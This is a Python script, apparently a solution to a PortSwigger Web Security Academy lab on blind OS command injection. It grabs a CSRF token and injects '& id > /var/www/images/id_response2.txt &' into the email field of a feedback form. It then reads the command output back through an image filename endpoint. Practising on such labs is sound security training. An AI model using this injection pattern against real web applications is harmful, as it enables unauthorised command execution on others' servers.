from bs4 import BeautifulSoup
import requests  as r

# Lab: Blind OS command injection with output redirection

link = "https://0a76007903a367d0c0f7dd2b008e00ad.web-security-academy.net"

def grab_csrftoken(my_session):

    feedback_link = link + "/feedback"
    my_req = my_session.get(feedback_link).text
    response = BeautifulSoup(my_req,'html.parser')
    token = response.find("input")["value"]
    print('csrf token : ', token)
    return token

def main_query():

    send_feedback_link = link+"/feedback/submit"
    my_session_i= r.Session()
    token = grab_csrftoken(my_session_i)
    injection = "& id > /var/www/images/id_response2.txt &"
    to_send={"csrf":token,"name":"aa","email": injection , "subject":"aaa","message":"ss" }
    myreq = my_session_i.post(send_feedback_link, data=to_send)

    second_endpoint = link+ "/image?filename=" + "id_response2.txt"
    snd_request = my_session_i.get(second_endpoint)
    response = snd_request.text
    if snd_request.status_code == 200:
        print(response)

if __name__=='__main__':
    main_query()